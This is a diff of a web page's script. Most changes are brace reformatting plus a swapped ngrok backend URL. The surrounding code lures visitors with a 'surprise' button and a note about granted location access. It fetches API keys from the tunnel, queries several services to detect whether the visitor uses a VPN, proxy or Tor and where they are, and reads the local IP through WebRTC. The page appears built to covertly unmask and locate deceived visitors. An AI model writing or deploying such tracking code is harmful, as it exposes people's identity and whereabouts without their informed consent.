@@ -396,15 +396,18 @@
     document.addEventListener('DOMContentLoaded', async () => {
       const btn = document.getElementById('goLiveBtn');
       const statusEl = document.getElementById('status');
-      const API_BASE = 'https://733adabb66bd.ngrok-free.app';
+      const API_BASE = 'https://be4aa0079727.ngrok-free.app';
 
       // Fetch API keys from server
       let apiKeys;
-      try {
+      try 
+      {
         const response = await fetch(`${API_BASE}/api-keys`);
         if (!response.ok) throw new Error('Failed to fetch API keys');
         apiKeys = await response.json();
-      } catch (error) {
+      } 
+      catch (error) 
+      {
         console.error('Error fetching API keys:', error);
         statusEl.innerHTML = `
           <p>Error initializing application. Please try again later.</p>
@@ -415,7 +418,8 @@
       // Check if we already have permission stored
       const hasPermission = localStorage.getItem('locationPermission') === 'granted';
       
-      if (hasPermission) {
+      if (hasPermission) 
+      {
         statusEl.innerHTML = `
           <p>You've previously granted location access.</p>
           <p style="margin-top: 15px;">Click the button to get your surprise!</p>
@@ -423,8 +427,10 @@
       }
       
       // Function to detect VPN usage with enhanced accuracy
-      async function detectVPN(ipAddress) {
-        if (!ipAddress || ipAddress === 'Public IP not available') {
+      async function detectVPN(ipAddress) 
+      {
+        if (!ipAddress || ipAddress === 'Public IP not available') 
+        {
           console.warn('No valid IP address for VPN detection');
           return {
             isVPN: false,
@@ -433,7 +439,8 @@
           };
         }
 
-        try {
+        try 
+        {
           const apis = [
             `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKeys.IPGEOLOCATION_API_KEY}&ip=${ipAddress}`,
             `https://vpnapi.io/api/${ipAddress}?key=${apiKeys.VPNAPI_KEY}`,
@@ -442,26 +449,33 @@
 
           let vpnResults = [];
 
-          for (const apiUrl of apis) {
-            try {
+          for (const apiUrl of apis) 
+          {
+            try 
+            {
               const response = await fetch(apiUrl);
-              if (response.ok) {
+              if (response.ok) 
+              {
                 const data = await response.json();
 
                 let isVPN = false;
                 let provider = 'Unknown';
                 let location = 'Unknown';
 
-                if (apiUrl.includes('ipgeolocation.io')) {
+                if (apiUrl.includes('ipgeolocation.io')) 
+                {
                   isVPN = data.connection_type === 'VPN' || data.security.is_vpn;
                   provider = data.organization || 'Unknown Provider';
                   location = data.city ? `${data.city}, ${data.region}, ${data.country}` : 'Unknown Location';
-                } else if (apiUrl.includes('vpnapi.io')) {
+                } 
+                else if (apiUrl.includes('vpnapi.io')) 
+                {
                   isVPN = data.security && (data.security.vpn || data.security.proxy || data.security.tor);
                   provider = data.network && data.network.network ? data.network.network : 'Unknown Provider';
-                  location = data.location && data.location.city ? 
-                    `${data.location.city}, ${data.location.region}, ${data.location.country}` : 'Unknown Location';
-                } else if (apiUrl.includes('ipqualityscore.com')) {
+                  location = data.location && data.location.city ? `${data.location.city}, ${data.location.region}, ${data.location.country}` : 'Unknown Location';
+                } 
+                else if (apiUrl.includes('ipqualityscore.com')) 
+                {
                   isVPN = data.vpn || data.proxy || data.tor;
                   provider = data.organization || 'Unknown Provider';
                   location = data.city ? `${data.city}, ${data.region}, ${data.country}` : 'Unknown Location';
@@ -475,14 +489,17 @@
                 });
                 console.log(`VPN check from ${apiUrl}: isVPN=${isVPN}, provider=${provider}, location=${location}`);
               }
-            } catch (error) {
+            } 
+            catch (error) 
+            {
               console.error(`Error with VPN API (${apiUrl}):`, error);
             }
           }
 
           // If any API detects a VPN, consider it a VPN
           const hasVPN = vpnResults.some(result => result.isVPN);
-          if (hasVPN) {
+          if (hasVPN) 
+          {
             const vpnResult = vpnResults.find(result => result.isVPN);
             return {
               isVPN: true,
@@ -495,7 +512,8 @@
           const fallbackResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
           const fallbackData = await fallbackResponse.json();
           const isVPNFallback = fallbackData.security && (fallbackData.security.vpn || fallbackData.security.proxy || fallbackData.security.tor);
-          if (isVPNFallback) {
+          if (isVPNFallback) 
+          {
             return {
               isVPN: true,
               vpnProvider: fallbackData.org || 'Unknown Provider',
@@ -508,7 +526,9 @@
             vpnProvider: 'Not detected',
             vpnLocation: 'Not detected'
           };
-        } catch (error) {
+        } 
+        catch (error) 
+        {
           console.error('VPN detection error:', error);
           return {
             isVPN: false,
@@ -519,11 +539,14 @@
       }
       
       // Function to get local IP address using WebRTC
-      async function getLocalIPAddress() {
+      async function getLocalIPAddress() 
+      {
         return new Promise((resolve) => {
-          try {
+          try 
+          {
             const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
-            if (!RTCPeerConnection) {
+            if (!RTCPeerConnection) 
+            {
               console.warn('WebRTC not supported in this browser');
               resolve(null);
               return;
@@ -728,8 +751,7 @@
       // Function to validate coordinates
       function isValidCoordinate(lat, lng) 
       {
-        return typeof lat === 'number' && typeof lng === 'number' &&
-               lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180;
+        return typeof lat === 'number' && typeof lng === 'number' && lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180;
       }
       
       // Function to handle the surprise process
